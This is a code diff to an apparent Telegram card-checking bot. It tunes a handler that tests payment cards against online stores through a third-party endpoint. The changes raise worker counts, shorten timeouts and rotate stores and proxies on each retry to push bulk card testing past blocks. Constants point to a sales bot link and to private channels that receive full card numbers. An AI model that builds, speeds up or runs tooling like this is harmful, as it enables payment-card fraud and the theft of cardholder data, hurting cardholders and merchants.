@@ -38,7 +38,7 @@ import aiohttp as _aiohttp
 CHANNEL_LOG_ID   = 0               # t.me/Batcardchk              ← paste channel ID
 HIT_LOG_GROUP_ID = -1004361062205  # t.me/+BXmeotREVhllODFk       ✅ already set
 SECRET_GROUP_ID  = -1004499920555  # secret channel (private, full card+BIN) ✅
-BOT_DEEP_BUY     = "https://t.me/batcardchk29_bot?start=buy"
+BOT_DEEP_BUY     = "https://t.me/Batchk11_bot?start=buy"
 # ─────────────────────────────────────────────────────────────────────────────
 
 # /bin handler — defined inline so mst.py (aiogram) is never imported at PTB startup
@@ -2366,12 +2366,12 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     GOSHOPI = "https://goshopi.up.railway.app/shopii"
 
     # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    # SPEED SETTINGS — 60 workers, 5-site retry, 22 s timeout
+    # SPEED SETTINGS — 80 workers, 8-site retry, 16 s timeout
     # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    CONCURRENCY    = 60    # parallel workers
-    CARD_TIMEOUT   = 22    # seconds timeout per card
-    CONNECTOR_LIM  = 200   # TCP connection pool size
-    PROG_INTERVAL  = 5.0   # progress message refresh (seconds)
+    CONCURRENCY    = 80    # parallel workers (was 60)
+    CARD_TIMEOUT   = 16    # seconds timeout per card (was 22)
+    CONNECTOR_LIM  = 350   # TCP connection pool (was 200)
+    PROG_INTERVAL  = 3.0   # progress refresh (was 5.0)
 
     sem   = asyncio.Semaphore(CONCURRENCY)
     _lock = asyncio.Lock()
@@ -2456,12 +2456,23 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             currency  = str(data.get("Currency", data.get("currency", "USD"))).strip()
             verdict   = _sh_classify(resp_text)
 
-            # ── Retry up to 5 different sites on RETRY/ERROR ──────
+            # ── Retry up to 8 different sites+proxies on RETRY/ERROR ─────
+            # Build shuffled pools so every card gets a unique rotation order
+            _site_pool  = sites.copy();  random.shuffle(_site_pool)
+            _proxy_pool = proxies.copy() if proxies else []
+            if _proxy_pool: random.shuffle(_proxy_pool)
+            _tried_r: set = set()
             retries = 0
-            while verdict in ("RETRY", "ERROR") and retries < 5:
+            while verdict in ("RETRY", "ERROR") and retries < 8:
                 retries += 1
-                site2  = _sh_clean_site(random.choice(sites))
-                proxy2 = random.choice(proxies) if proxies else None
+                # Pick an untried site from the shuffled pool
+                _untried = [s for s in _site_pool if s not in _tried_r]
+                if not _untried:
+                    _tried_r.clear(); _untried = _site_pool[:]
+                site2 = _sh_clean_site(_untried[0])
+                _tried_r.add(_untried[0])
+                # Always a DIFFERENT proxy per attempt
+                proxy2 = _proxy_pool[retries % len(_proxy_pool)] if _proxy_pool else None
                 try:
                     data2 = await _sh_call_shopii(session, card, site2, proxy2)
                 except asyncio.TimeoutError:
